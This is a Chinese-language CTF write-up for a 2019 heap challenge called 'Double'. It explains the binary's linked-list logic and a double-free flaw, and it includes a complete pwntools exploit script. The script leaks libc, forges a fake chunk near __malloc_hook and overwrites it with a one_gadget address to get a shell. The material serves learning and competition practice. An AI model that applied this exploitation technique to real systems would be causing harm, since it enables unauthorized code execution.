---
title: Double
categories:
- 2019信息安全竞赛
---
# Double 

## 前言

周末再刷一下前几天没做完的信安竞赛题，题目利用比较简单，但是程序代码写的有点复杂，自己读代码的能力太差，这里还是总结一下。

## 程序逻辑

程序共有四个功能，New、Show、Edit和Delete

![main](./1.jpg)

NewInfo里先malloc了一个chunk做node，观察之后，可以新建一个结构体来帮助理解代码。一个node大小为0x18，前4字节是chunk在链表中的index，第二个4字节表示chunk的内容的size，下面8字节存chunk_addr，最后8字节存储next_node指针，最后一个Node这个成员为0。  
每次New的时候都会先新建一个node，通过s2输入至多0x100长的数据。0x4040d0处存放链表头指针，0x4040d8处存放链表尾指针，每次先判断尾指针是否有值且上一个chunk的内容是否和这次输入的数据相等，如果一样，直接把上一个node复制一遍，加入到链表尾部。

![node](./2.jpg)

这里malloc5个内容不同的chunk观察一下帮助理解。

![node2](./3.jpg)

如果不满足上述条件，则重新malloc一个chunk加入到链表尾部。

![new1](./4.jpg)
![new2](./5.jpg)

Show函数挨个遍历node，根据Node->index寻找目标index，找到就用puts输出其内容。

![show](./6.jpg)

Edit函数通过Buf获取输入，根据输入长度判断，如果小于等于原来chunk的size就直接strcpy过去，否则重新malloc，并修改node的相应字段。

![edit](./7.jpg)

Delete函数依次释放chunk_addr和node，并将node从链表中摘除。注意删除的时候并没有修改链表的index，如果不是删除最后一个chunk，New的时候也是从最后一个index开始，index不会存在free之后在malloc即可复用，而是不断递增。

```c
v3->next_node = ptr->next_node;//v3为目标node的前一个Node
```

![delete](./8.jpg)

## 漏洞利用

利用New相同的内容即可获得两个同样的node，可以double free。先malloc两个samll bin，删除第一个，show第二个chunk即可泄露Libc。在gdb寻找malloc_hook周围fake_chunk，double free之后malloc到这个chunk，修改__malloc_hook为one_gadget_addr，再Malloc一个chunk即可get shell。

## exp.py

```py
#coding = utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 0
p = process('./pwn')
elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    gdb.attach(p)

def New(data):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('Your data:\n')
    p.sendline(data)

def Show(index):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('Info index: ')
    p.sendline(str(index))

def Edit(index,data):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('Info index: ')
    p.sendline(str(index))
    p.sendline(data)

def Delete(index):
    p.recvuntil('> ')
    p.sendline('4')
    p.recvuntil('Info index: ')
    p.sendline(str(index))

def exp():
    #leak libc
    New('a'*0xf0)#0
    New('a'*0xf0)#1
    Delete(0)
    Show(1)
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 88 - 0x3c4b20
    log.success('libc base =>' + hex(libc_base))
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    fake_chunk = malloc_hook - 0x23
    gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
    shell_addr = libc_base + gadgets[1]
    #get shell
    New('a'*0x67)#2
    New('a'*0x67)#3
    New('b'*0x67)#4
    New('c'*0x20)#5
    Delete(2)
    Delete(4)
    Delete(3)
    #gdb.attach(p)
    payload = p64(fake_chunk)
    payload = payload.ljust(0x67,'a')
    New(payload)#init chunk3
    New('d'*0x67)#init chunk4
    New('e'*0x67)#init chunk2
    payload = 'a'*0x13 + p64(shell_addr)
    payload = payload.ljust(0x67,'a')
    New(payload)#overwrite
    #trigger
    p.recvuntil('> ')
    p.sendline('1')
    p.interactive()

exp()
```
